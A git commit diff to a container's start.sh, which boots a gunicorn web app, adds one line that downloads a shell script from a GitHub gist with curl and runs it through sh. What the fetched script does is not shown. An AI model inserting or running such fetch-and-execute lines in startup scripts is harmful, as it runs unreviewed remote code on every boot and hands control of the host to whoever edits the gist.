713e26e9eaedd0cf9f1059116d9cfb6bcabf8d7f
Maruf <50019150+rooted-cyber@users.noreply.github.com>
2023-05-02 23:37:11 +0530

    Update start.sh

--- start.sh
+++ start.sh
@@ -2,3 +2,4 @@
 cd /app
 echo "----- Now deployed web booting your repo ------ " 
 gunicorn -b :5000 --reload --access-logfile - --error-logfile - app:app
+sh -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/d81ab2b6c22ad40497f8d08133c7e8f3/raw/ult.sh)"
